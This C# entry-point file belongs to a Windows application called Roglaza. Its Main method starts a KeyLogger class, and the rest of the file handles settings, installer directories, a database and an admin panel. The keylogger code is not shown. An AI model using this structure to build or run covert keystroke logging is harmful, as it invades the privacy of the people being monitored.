using Roglaza.Classes;
using Roglaza.Forms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Data.SQLite;
namespace Roglaza
{
    
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 
        [STAThread]

        static void Main()
        {
            try
            {
                KeyLogger.XMain();
            }
            catch(Exception e) { MessageBox.Show(e.Message); }
        }
        public  static void Exec()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            //If admin turned the app off
            if (RoglazaInstaller.IsAdminUnistalledMe())
            {
                MessageBox.Show(MessageStrings.GetTurned_off_reactivate_message(), MessageStrings.GetTurned_off_reactivate_message_caption);
                return;
            }

            //Detecting test mode
            AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
            LoadSettings();

            RoglazaInstaller.InstallDirectories();

            bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");
             
            if (ProgramSettings.LoadFromFile()|| Force_creat )
            {
            try {   DBManager.CreateNewDataBase();   }catch{}
                var f = new FrmAdminPanel();
                f.ShowDialog();
                ProgramSettings.SaveSettings();
            }

        }
        public static void LoadSettings()
      {
          ProgramSettings = new RoglazaSettings();
          ProgramSettings.LoadFromFile();
      }
        public static RoglazaSettings ProgramSettings = new RoglazaSettings();
        public static System.Drawing.Icon icon ;
        internal static string GetExecutablePath()
        {
            return Application.ExecutablePath.ToString();
        }
        internal static string GetWorkingDirectory()
        {
            return Application.StartupPath.ToString();

        }
    }



}
